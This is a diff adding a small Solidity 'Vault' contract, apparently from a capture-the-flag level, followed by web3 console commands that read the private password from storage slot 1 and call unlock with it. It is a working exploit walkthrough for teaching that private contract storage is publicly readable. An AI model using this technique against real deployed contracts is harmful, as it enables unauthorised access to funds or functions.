@@ -1,0 +1,36 @@
+pragma solidity ^0.6.0;
+
+contract Vault {
+  bool public locked;
+  bytes32 private password;
+
+  constructor(bytes32 _password) public {
+    locked = true;
+    password = _password;
+  }
+
+  function unlock(bytes32 _password) public {
+    if (password == _password) {
+      locked = false;
+    }
+  }
+}
+
+*Web3 Browser Console Exploit*
+
+
+web3.eth.getStorageAt(contract.address, 1, function(err, result) { pwd = result })
+
+pwd
+
+// will show password in hex value from binary
+
+web3.toAscii(pwd)
+
+// will show password in readable UTF-8 plain text
+
+contract.unlock(pwd) 
+
+await contract.locked()
+
+// locked should be set to false 
